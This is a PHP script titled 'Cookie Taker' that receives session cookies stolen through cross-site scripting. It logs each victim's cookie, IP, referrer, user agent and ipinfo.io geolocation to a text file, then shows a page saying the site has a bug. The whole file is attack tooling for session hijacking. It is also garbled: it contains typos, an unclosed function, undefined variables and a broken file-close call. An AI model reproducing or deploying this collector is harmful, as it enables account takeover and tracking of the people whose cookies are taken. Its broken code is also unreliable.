<?php
###########################
#
#
#
# ------> Cookie Taker <------
#         Made By VectorF87
#
#
###########################

$cookie = "[+]Victim Cookie => [ " . $_GET['cookie'] . " ]";
$ip = "[+]Victim IP => [ " . $_SERVER['REMOTE_ADDR'] . " ]";
$ref = "[+]Victim Comes From => [ " . $_SERVER['HTTP_REFERER'] . " ]";
$uAgent = "[+]Victim uAgent => [ " . $_SERVER['HHTP_USER_AGENT'] . " ]";
$sIP = "[+]Server Ip => [ " . $_SERVER['SERVER_ADDR'] . " ]";

// stack over flow code 
function get_ip() {
    $ip = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else if(isset($_SERVER['HTTP_X_FORWARDED'])){
        $ip = $_SERVER['HTTP_X_FORWARDED'];
    }else if(isset($_SERVER['HTTP_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    }else if(isset($_SERVER['HTTP_FORWARDED'])){
        $ip = $_SERVER['HTTP_FORWARDED'];
    }else if(isset($_SERVER['REMOTE_ADDR'])){
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    return $ipaddress;


$PublicIP = get_client_ip();    
$json     = file_get_contents("http://ipinfo.io/$PublicIP/gep");
$json     = json_decode($json, true);   
$country  = "User Country Is => " . $json['country'];
$region   = "User Reigon Is => " . $json['region'];
$city     = "User City Is => " . $json['city'];
// en of stack overflow code
#######
$all = "\n- - - - -{Begin}- - - - -\n" . $cookie . "\n\n" . $ip . "\n\n" .    $ref . "\n\n" . $uAgent . "\n\n" . $sIP . "\n\n" . $country . "\n\n"  . $region . 
"\n\n" . $city . "\n\n" . "- - - - -{End}- - - - -"

$handle = fopen('cookies_logs.txt', 'a');
fwrite($handle, $all);
fclose('cookies_logs.txt' , 'a');
?>
<!DOCTYPE html>
<html>
    <head>
        <title>xss vuln</title>
    </head>
    <body>
        <p>You have a bug in your site.</p>
    </body>
</html>


                 
